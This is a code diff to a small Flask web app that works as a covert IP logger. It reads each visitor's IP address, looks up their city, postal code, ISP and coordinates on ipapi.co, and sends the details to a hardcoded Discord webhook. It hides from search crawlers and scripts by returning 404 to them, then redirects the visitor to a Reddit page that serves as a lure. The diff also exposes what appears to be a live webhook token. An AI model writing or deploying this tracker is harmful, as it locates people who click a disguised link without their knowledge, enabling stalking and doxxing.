@@ -4,16 +4,18 @@ from datetime import datetime
 
 app = Flask(__name__)
 
+# ===================== CONFIG =====================
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
 REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"
 
 BOT_KEYWORDS = [
     "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
     "YandexBot", "Sogou", "Exabot", "facebot", "facebookexternalhit",
-    "ia_archiver", "python-requests", "Go-http-client"
+    "python-requests", "Go-http-client"
 ]
 
 def get_client_ip():
+    """Detect the visitor's real IP."""
     headers = ["X-Forwarded-For", "X-Real-IP"]
     for h in headers:
         ip = request.headers.get(h)
@@ -24,6 +26,7 @@ def get_client_ip():
     return request.remote_addr
 
 def is_bot_or_vpn(info, user_agent):
+    """Detect bots, VPNs, or hosting IPs."""
     ua = user_agent.lower()
     for keyword in BOT_KEYWORDS:
         if keyword.lower() in ua:
@@ -34,19 +37,32 @@ def is_bot_or_vpn(info, user_agent):
     return False
 
 def get_ip_info(ip):
+    """Query ipapi.co for location and ISP info."""
     try:
         resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
-        return resp.json()
+        data = resp.json()
+        # Ensure numeric lat/lon
+        data["latitude"] = float(data.get("latitude") or 0)
+        data["longitude"] = float(data.get("longitude") or 0)
+        return data
     except:
-        return {}
+        return {
+            "city": "Unknown",
+            "region": "Unknown",
+            "country_name": "Unknown",
+            "postal": "Unknown",
+            "org": "Unknown",
+            "latitude": 0,
+            "longitude": 0
+        }
 
 @app.route('/')
 def index():
     ip = get_client_ip()
     user_agent = request.headers.get("User-Agent", "Unknown")
-
     info = get_ip_info(ip)
 
+    # Block bots/VPNs/proxies
     if is_bot_or_vpn(info, user_agent):
         abort(404)
 
@@ -61,6 +77,7 @@ def index():
 
     now = datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S GMT")
 
+    # Send a single webhook
     message = {
         "content": (
             f"🚶 **New Visitor Detected**\n"
@@ -80,7 +97,7 @@ def index():
     except Exception as e:
         print(f"[ERROR] Webhook failed: {e}")
 
-    # Redirect real visitors to your Reddit page
+    # Redirect visitors to Reddit
     return redirect(REDIRECT_URL, code=302)
 
 if __name__ == "__main__":
